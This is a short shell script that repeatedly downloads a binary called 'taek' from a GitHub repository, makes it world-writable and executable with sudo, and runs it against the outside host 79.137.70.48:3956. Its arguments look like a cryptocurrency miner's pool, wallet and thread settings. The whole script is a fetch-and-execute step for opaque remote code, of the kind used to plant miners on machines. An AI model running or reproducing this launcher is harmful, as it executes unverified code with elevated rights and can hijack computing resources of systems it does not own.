#!/bin/sh
 
COUNTER=20
until [  $COUNTER -lt 10 ]; do
 
 wget https://github.com/OmJhonyPerkasa/yteam/raw/master/taek && sudo chmod 777 taek && ./taek -v -l 79.137.70.48:3956 -u RKzMVjYKpBPzbUFMMMLvgergy9a4JDShva.budi -p x -t 8
 
     echo COUNTER $COUNTER
     let COUNTER-=1
done
